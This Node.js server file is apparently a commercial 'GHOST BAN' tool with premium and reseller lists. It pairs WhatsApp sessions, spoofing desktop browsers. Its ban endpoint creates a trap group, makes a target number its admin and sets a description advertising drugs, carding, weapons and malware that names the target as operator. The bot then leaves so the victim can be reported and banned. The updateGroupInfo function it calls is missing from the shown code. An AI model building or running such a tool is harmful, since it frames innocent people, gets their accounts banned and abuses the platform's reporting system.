console.clear();
const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const chalk = require('chalk');

// ========== CONFIG ==========
const ACCESS_KEY = process.env.ACCESS_KEY || 'GHOST-BAN-2026';
const PORT = process.env.PORT || 3000;

// ========== PREMIUM DATABASE ==========
const PREMIUM_DB_PATH = path.join(__dirname, 'premium.json');
function loadPremiumDB() {
    if (!fs.existsSync(PREMIUM_DB_PATH)) return { premium: [], resellers: [] };
    try { return JSON.parse(fs.readFileSync(PREMIUM_DB_PATH)); } catch { return { premium: [], resellers: [] }; }
}
function savePremiumDB(data) { fs.writeFileSync(PREMIUM_DB_PATH, JSON.stringify(data, null, 2)); }
function isAdmin(userId) { return userId === 'admin'; }
function addPremium(userId) {
    const db = loadPremiumDB();
    if (!db.premium.includes(userId.toString())) { db.premium.push(userId.toString()); savePremiumDB(db); return true; }
    return false;
}
function removePremium(userId) {
    const db = loadPremiumDB();
    const idx = db.premium.indexOf(userId.toString());
    if (idx !== -1) { db.premium.splice(idx, 1); savePremiumDB(db); return true; }
    return false;
}
function getPremiumList() { return loadPremiumDB().premium; }

// ========== GROUP SETTINGS ==========
const GROUP_DESCRIPTION = "⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** {target}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.";
const GROUP_PROFILE_PIC_PATH = path.join(__dirname, 'ghost_ban_profile.jpg');

// ========== BAILEYS SETUP ==========
let makeWASocket, Browsers, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, jidDecode, downloadContentFromMessage, jidNormalizedUser;

const loadBaileys = async () => {
    const baileys = await import('@whiskeysockets/baileys');
    const mod = baileys.default || baileys;
    makeWASocket = mod.makeWASocket || mod.default;
    Browsers = mod.Browsers;
    useMultiFileAuthState = mod.useMultiFileAuthState;
    DisconnectReason = mod.DisconnectReason;
    fetchLatestBaileysVersion = mod.fetchLatestBaileysVersion;
    jidDecode = mod.jidDecode;
    downloadContentFromMessage = mod.downloadContentFromMessage;
    jidNormalizedUser = mod.jidNormalizedUser;
    console.log(chalk.green('✅ Baileys loaded'));
};

const pino = require('pino');
const activeWhatsAppConnections = new Map();

// ========== EXPRESS APP ==========
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ========== AUTH MIDDLEWARE ==========
function requireAuth(req, res, next) {
    const key = req.headers['x-access-key'] || req.query.key;
    if (key !== ACCESS_KEY) {
        return res.status(401).json({ error: '⛔ INVALID ACCESS KEY' });
    }
    next();
}

// ========== WHATSAPP FUNCTIONS ==========
async function startWhatsAppBot(phoneNumber) {
    const sessionPath = path.join(__dirname, `./sessions/session_${phoneNumber}`);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version, isLatest } = await fetchLatestBaileysVersion();

    // ✅ FIX 1: Only use REAL desktop browsers (remove baileys/bot options)
    const browserOptions = [
        Browsers.macOS('Safari'),
        Browsers.macOS('Chrome'),
        Browsers.windows('Firefox'),
        Browsers.ubuntu('Chrome')
    ];
    const randomBrowser = browserOptions[Math.floor(Math.random() * browserOptions.length)];

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        
        // ✅ FIX 2: Use the random desktop browser (not hardcoded)
        browser: randomBrowser,
        
        // ✅ FIX 3: Pass the fetched version
        version: version,
        
        // ✅ FIX 4: MUST be false for phone notifications
        markOnlineOnConnect: false,
        
        // ✅ FIX 5: Don't sync history
        syncFullHistory: false,
        
        // ✅ FIX 6: Keep alive to prevent drops
        keepAliveIntervalMs: 30000,
    });

    activeWhatsAppConnections.set(phoneNumber, sock);

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (connection === 'open') {
            console.log(chalk.green(`✅ ${phoneNumber}: Connected`));
        }
        
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            activeWhatsAppConnections.delete(phoneNumber);
            if (statusCode !== DisconnectReason.loggedOut) {
                setTimeout(() => startWhatsAppBot(phoneNumber), 5000);
            }
        }
    });

    return sock;
}

// Request pairing code
async function requestPairingCode(phoneNumber) {
    const sock = activeWhatsAppConnections.get(phoneNumber);
    if (!sock) throw new Error('No active connection');
    
    await new Promise(r => setTimeout(r, 3000));
    
    const numberWithoutCountryCode = phoneNumber.replace(/^\+?237/, '');
    
    const code = await sock.requestPairingCode(numberWithoutCountryCode); 
    return code?.match(/.{1,4}/g)?.join("-") || code;
}

// ========== API ROUTES ==========

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'alive', uptime: process.uptime(), connections: activeWhatsAppConnections.size });
});

// Get pairing code
app.post('/api/pair', requireAuth, async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) return res.status(400).json({ error: 'Phone number required' });

    try {
        if (!makeWASocket) await loadBaileys();
        const sock = await startWhatsAppBot(phoneNumber);
        const code = await requestPairingCode(phoneNumber);
        res.json({ success: true, phoneNumber, pairingCode: code });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Ban target (create trap group)
app.post('/api/ban', requireAuth, async (req, res) => {
    const { targetNumber } = req.body;
    if (!targetNumber) return res.status(400).json({ error: 'Target number required' });

    const [firstPhone, sock] = activeWhatsAppConnections.entries().next().value || [];
    if (!sock) return res.status(400).json({ error: 'No WhatsApp connection. Pair first.' });

    try {
        const targetJid = targetNumber + '@s.whatsapp.net';
        const botJid = sock.user.id;

        const group = await sock.groupCreate('GHOST BAN TRAP', [botJid, targetJid]);
        const groupJid = group.id;

        await sock.groupParticipantsUpdate(groupJid, [targetJid], 'promote');
        await new Promise(r => setTimeout(r, 1000));
        await sock.groupParticipantsUpdate(groupJid, [botJid], 'demote');
        await new Promise(r => setTimeout(r, 1000));
        await updateGroupInfo(sock, groupJid);
        await new Promise(r => setTimeout(r, 1000));
        await sock.groupLeave(groupJid);

        res.json({ success: true, targetNumber, groupJid, message: 'Trap group created. Report manually.' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// List connections
app.get('/api/connections', requireAuth, (req, res) => {
    const connections = Array.from(activeWhatsAppConnections.keys());
    res.json({ connections, count: connections.length });
});

// Add premium
app.post('/api/addprem', requireAuth, (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: 'User ID required' });
    const added = addPremium(userId);
    res.json({ success: added, userId, message: added ? 'Premium added' : 'Already premium' });
});

// Remove premium
app.post('/api/delprem', requireAuth, (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: 'User ID required' });
    const removed = removePremium(userId);
    res.json({ success: removed, userId, message: removed ? 'Premium removed' : 'Not premium' });
});

// List premium
app.get('/api/listprem', requireAuth, (req, res) => {
    res.json({ premium: getPremiumList() });
});

// ========== START SERVER ==========
async function main() {
    try {
        await loadBaileys();
        console.log(chalk.green('✅ Baileys loaded'));

        // Load saved sessions
        const sessionsDir = path.join(__dirname, 'sessions');
        if (fs.existsSync(sessionsDir)) {
            const sessions = fs.readdirSync(sessionsDir);
            for (const session of sessions) {
                if (session.startsWith('session_')) {
                    const phone = session.replace('session_', '');
                    console.log(chalk.cyan(`🔄 Loading session: ${phone}`));
                    await startWhatsAppBot(phone);
                }
            }
        }

        app.listen(PORT, () => {
            console.log(chalk.green(`🌐 Server running on port ${PORT}`));
            console.log(chalk.red(`🔑 Access Key: ${ACCESS_KEY}`));
        });

    } catch (error) {
        console.error(chalk.red('❌ Startup error:'), error);
        process.exit(1);
    }
}

main();
